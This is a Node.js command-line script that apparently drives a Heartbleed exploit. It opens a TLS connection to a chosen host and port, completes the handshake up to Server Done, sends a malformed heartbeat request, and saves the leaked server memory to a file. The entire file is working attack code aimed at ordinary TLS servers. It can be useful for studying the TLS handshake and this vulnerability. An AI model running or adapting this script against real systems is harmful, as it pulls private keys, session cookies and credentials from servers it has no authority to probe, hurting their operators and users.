require('log-node')();
const net = require('net');
const fs = require('fs');
const Path = require('path');
const log = require('log').get('main');
const PacketCutter = require('./src/cutter.js');
const packets = require('./src/packets.js');
const parse = require('./src/parser.js');
const when = require('./src/when.js');
const C = require('./src/constants.js');

const program = require('commander')
    .version('0.1.0')
    .usage('<host> [options]')
    .option('-p, --port <port>', 'The port to connect to')
    .option('-o, --out <file>', 'The file you want the heartbeat data to be written to')
    .parse(process.argv);

// Connect a socket
const socket = net.connect(program.port || 443, program.args[0]);
const cutter = new PacketCutter(5, getLength);
socket.pipe(cutter);

// Log all messages we receive
// and check for warnings or errors
cutter.on('data', function (buffer) {
    log.info('Received record (' + buffer.length + ' bytes)');
    const record = parse(buffer);
    log.debug(record);
    
    if (record.type === C.messageType.ALERT) {
        log.warning(`Received alert from server: level=${
            C.alert.level[record.message.level]
        }, description=${
            C.alert.description[record.message.description]
        }`);
    }
});

(async function() {
    // First, wait for the socket to connect
    await when(socket, 'connect');
    
    // Now send the Client Hello message, containing our supported ciphers, SSL / TLS version, etc.
    log.notice('Connected!');
    log.notice('Sending client hello...');
    send(packets.hello());
    
    // As a response to our Client Hello, the server will send a few messages:
    // - Server Hello: contains chosen ciphers, SSL / TLS version of the server etc.
    // - Certificate: contains the server's certificate chain
    // - Server Key Exchange (optional): some algorithms (e.g. Diffie-Hellman) require some extra data, which is included in this record
    // - Certificate Request (optional): the server can optionally request a certificate from the client
    // - Server Done: signals that the server has sent all the above messages (or at least the ones it chose to send)
    // This last one is what we are looking for; we don't care about the other ones
    await when(cutter, isServerDone);
    
    // We got the Server Done message. Now we can send a heartbeat!
    log.notice('Server is done. Sending heartbeat...');
    send(packets.heartbleed());
    
    const response = parse(await when(cutter));
    log.notice(`Received heartbeat data: ${response.message.payload.length} bytes`);
    
    if(program.out) {
        log.notice('Writing to file...');
        fs.writeFile(program.out, response.message.payload, function(err) {
            if(err) {
                log.error(err);
            }
            else {
                log.info('Data written to file: ' + Path.resolve(program.out));
            }
        });
    }
    else {
        log.warning('Use the --out or -o options to write this data to a file.');
    }
    
    socket.end();
})();

function send(packet) {
    log.debug(parse(packet));
    socket.write(packet, function () {
        log.info('Wrote packet');
    });
}

function isServerDone(packet) {
    return packet[0] === C.messageType.HANDSHAKE &&
        packet[5] === C.handshakeType.SERVER_DONE
}

function getLength(header) {
    return parseInt(
        header
            .slice(3, 5)
            .toString('hex'),
        16
    ) + 5;
}